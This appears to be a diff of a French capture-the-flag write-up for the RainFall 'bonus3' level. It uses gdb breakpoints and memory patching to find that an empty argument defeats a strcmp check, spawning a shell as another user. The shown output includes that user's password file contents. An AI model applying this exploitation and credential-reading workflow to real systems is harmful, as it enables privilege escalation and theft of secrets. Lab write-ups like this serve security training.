@@ -1,7 +1,89 @@
-(gdb) b*main+5
+ouvrons le binaire dans gdb => gdb -q bonus3
+
+il y a un fopen et un fread du fichier "/home/user/end/.pass"
+
+malheureusement il n'y a pas l'air d'y avoir une fonction d'affichage de ce buffer par la suite, ni de fonction cachée pour.
+
+Heureusement, main<+262> nous remarquons la fonction execl : execl("/bin/sh", "sh", NULL);
+
+Qui s'exécute en fonction du strcmp un peu plus haut.
+
+Breakons avant et sur le strcmp pour regarder ses arguments.
+
+(gdb) b*main+219
+Breakpoint 4 at 0x80485cf
+(gdb) b*main+230
+Breakpoint 1 at 0x80485da
 (gdb) r
-(gdb) set {char [24]} 0x080486f2 = "/home/user/bonus3/.pass"
-ou
-set {char [12]} 0x080486f2 = "/tmp/ezOpen"
-    => to be able to debug in gdb
+Starting program: /home/user/bonus3/bonus3
+[Inferior 1 (process 8048) exited with code 0377]
+
+Nous n'y arrivons pas.
+
+La comparaison du main<+63> doit retourner un fd NULL par manque de droit avec l'exécution du fichier sous gdb.
+
+Remplaçons le path du fichier à ouvrir pour "/home/user/bonus/.pass" dont nous aurons les droits avec le user bonus3
+
+pour cela il faut procéder comme suit.
+    (gdb) b*main+5
+    (gdb) r
+    (gdb) set {char [24]} 0x080486f2 = "/home/user/bonus3/.pass"
+        => to be able to debug in gdb
+
+ce qui donne :
+    (gdb) b main
+    Breakpoint 2 at 0x80484f9
+    (gdb) r
+    Starting program: /home/user/bonus3/bonus3
+    
+    Breakpoint 2, 0x080484f9 in main ()
+    (gdb) set {char [24]} 0x080486f2 = "/home/user/bonus3/.pass"
+    (gdb) c
+    Continuing.
+    [Inferior 1 (process 8059) exited with code 0377]
+
+Le programme attend un argument.
+
+Nous remarquons un atoi, sûrement celui-ci doit être un nombre.
+
+    (gdb) c
+    Continuing.
+    
+    Breakpoint 4, 0x080485cf in main ()
+    (gdb) x/s $eax
+    0xbffff8d7:	 "10"
+    (gdb) c
+    Continuing.
+    
+    Breakpoint 3, 0x080485d7 in main ()
+    (gdb) x/s $eax
+    0xbffff668:	 "71d449df0f"
+
+Observons nos arguments :
+"10" semble être argv[1]
+"71d449df0f" => cet argument correspond aux 10 premiers caractères du contenu du fichier "/home/user/bonus3/.pass"
+ce qui correspond à un slice de la taille de l'argument donné
+avec 5 comme argument on obtient : 
+    (gdb) x/s $eax
+    0xbffff8d8:	 "5"
+    (gdb) x/s $eax
+    0xbffff668:	 "71d44"
+La théorie semble se confirmer
+
+Notre argument coupe le buffer en introduisant un '\0' à la position de atoi(argv[1]).
+Il faut que le buffer résultant soit identique à notre argv[1]
+
+Un buffer vide semble être le plus simple à reproduire.
+
+Et atoi("") = 0
+
+Donc :
+
+bonus3@RainFall:~$ ./bonus3 ""
+$ whoami
+end
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+$
+
 
